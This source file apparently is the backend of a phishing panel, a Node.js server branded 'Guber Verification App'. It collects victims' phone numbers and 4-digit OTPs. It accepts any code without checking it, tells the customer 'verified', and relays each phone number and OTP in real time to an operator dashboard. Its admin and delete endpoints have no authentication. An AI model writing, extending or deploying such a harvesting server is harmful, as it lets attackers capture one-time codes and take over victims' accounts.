const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const connectDB = require('./config/db');
const Verification = require('./models/Verification');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

let isMongoConnected = false;
// Fallback in-memory persistence if MongoDB is offline
const localVerifications = [];

// Middlewares
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connect to MongoDB
connectDB().then((connected) => {
    isMongoConnected = connected;
});

// Serve Admin Dashboard page explicitly
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// REST API Endpoints
app.get('/api/verifications', async (req, res) => {
    try {
        if (isMongoConnected) {
            const data = await Verification.find().sort({ createdAt: -1 });
            return res.json({ success: true, source: 'MongoDB', data });
        } else {
            return res.json({ success: true, source: 'LocalStore', data: [...localVerifications].reverse() });
        }
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.get('/api/stats', async (req, res) => {
    try {
        if (isMongoConnected) {
            const total = await Verification.countDocuments();
            const pending = await Verification.countDocuments({ status: 'PHONE_SUBMITTED' });
            const verified = await Verification.countDocuments({ status: 'VERIFIED' });
            return res.json({ success: true, total, pending, verified });
        } else {
            const total = localVerifications.length;
            const pending = localVerifications.filter(v => v.status === 'PHONE_SUBMITTED').length;
            const verified = localVerifications.filter(v => v.status === 'VERIFIED').length;
            return res.json({ success: true, total, pending, verified });
        }
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.delete('/api/verifications/:id', async (req, res) => {
    try {
        const { id } = req.params;
        if (isMongoConnected) {
            await Verification.findByIdAndDelete(id);
        }
        const idx = localVerifications.findIndex(v => v._id === id || v.id === id);
        if (idx !== -1) localVerifications.splice(idx, 1);
        
        io.emit('record_deleted', { id });
        res.json({ success: true, message: 'Record deleted' });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

app.delete('/api/verifications', async (req, res) => {
    try {
        if (isMongoConnected) {
            await Verification.deleteMany({});
        }
        localVerifications.length = 0;
        io.emit('all_records_cleared');
        res.json({ success: true, message: 'All records cleared' });
    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

// Socket.io Real-time Logic
io.on('connection', (socket) => {
    console.log(`[Socket.io] New client connected: ${socket.id}`);

    // Customer submits phone number
    socket.on('submit_phone', async (data, callback) => {
        const phoneNumber = data.phoneNumber ? data.phoneNumber.trim() : '';
        if (!phoneNumber) {
            if (callback) callback({ success: false, message: 'رقم الهاتف مطلوب' });
            return;
        }

        const now = new Date();
        const clientIp = socket.handshake.address;
        let record;

        try {
            if (isMongoConnected) {
                record = new Verification({
                    phoneNumber,
                    status: 'PHONE_SUBMITTED',
                    ipAddress: clientIp,
                    submittedAt: now
                });
                await record.save();
            } else {
                record = {
                    _id: 'LOCAL_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
                    phoneNumber,
                    otp: null,
                    status: 'PHONE_SUBMITTED',
                    ipAddress: clientIp,
                    submittedAt: now,
                    createdAt: now
                };
                localVerifications.push(record);
            }

            console.log(`[Notification] Phone submitted: ${phoneNumber}`);

            // Broadcast real-time notification to all connected Admin dashboards
            io.emit('admin_notification', {
                type: 'NEW_PHONE',
                data: {
                    id: record._id,
                    phoneNumber: record.phoneNumber,
                    status: 'PHONE_SUBMITTED',
                    submittedAt: record.submittedAt,
                    message: `العميل صاحب الرقم ${phoneNumber} قام بطلب كود التحقق`
                }
            });

            if (callback) {
                callback({
                    success: true,
                    verificationId: record._id,
                    message: 'تم إرسال طلب الكود بنجاح'
                });
            }
        } catch (err) {
            console.error('Error handling submit_phone:', err);
            if (callback) callback({ success: false, message: err.message });
        }
    });

    // Customer submits 4-Digit OTP
    socket.on('submit_otp', async (data, callback) => {
        const { verificationId, phoneNumber, otp } = data;

        if (!otp || otp.length !== 4) {
            if (callback) callback({ success: false, message: 'برجاء إدخال كود OTP مكون من 4 أرقام' });
            return;
        }

        const now = new Date();
        let updatedRecord = null;

        try {
            if (isMongoConnected && verificationId && !verificationId.startsWith('LOCAL_')) {
                updatedRecord = await Verification.findByIdAndUpdate(
                    verificationId,
                    {
                        otp: otp,
                        status: 'VERIFIED',
                        verifiedAt: now
                    },
                    { new: true }
                );
            }

            if (!updatedRecord) {
                // Check local store or fallback search by phone
                const localRec = localVerifications.find(
                    v => (verificationId && (v._id === verificationId || v.id === verificationId)) || v.phoneNumber === phoneNumber
                );
                if (localRec) {
                    localRec.otp = otp;
                    localRec.status = 'VERIFIED';
                    localRec.verifiedAt = now;
                    updatedRecord = localRec;
                } else {
                    // Create new if record missing
                    updatedRecord = {
                        _id: 'LOCAL_' + Date.now(),
                        phoneNumber: phoneNumber || 'غير معروف',
                        otp: otp,
                        status: 'VERIFIED',
                        submittedAt: now,
                        verifiedAt: now,
                        createdAt: now
                    };
                    localVerifications.push(updatedRecord);
                }
            }

            console.log(`[Notification] OTP Verified: ${updatedRecord.phoneNumber} -> OTP: ${otp}`);

            // Broadcast real-time notification to Admin dashboard with exact requested wording format
            io.emit('admin_notification', {
                type: 'OTP_SUBMITTED',
                data: {
                    id: updatedRecord._id,
                    phoneNumber: updatedRecord.phoneNumber,
                    otp: otp,
                    status: 'VERIFIED',
                    verifiedAt: updatedRecord.verifiedAt,
                    message: `العميل (${updatedRecord.phoneNumber}) قام بوضع الـ OTP: [ ${otp} ] و تم التحقق بنجاح`
                }
            });

            if (callback) {
                callback({
                    success: true,
                    status: 'VERIFIED',
                    message: 'تم التحقق بنجاح'
                });
            }
        } catch (err) {
            console.error('Error handling submit_otp:', err);
            if (callback) callback({ success: false, message: err.message });
        }
    });

    socket.on('disconnect', () => {
        // Log disconnection silently
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`====================================================`);
    console.log(`🚀 Guber Verification App running on http://localhost:${PORT}`);
    console.log(`📊 Admin Dashboard available at http://localhost:${PORT}/admin`);
    console.log(`====================================================`);
});
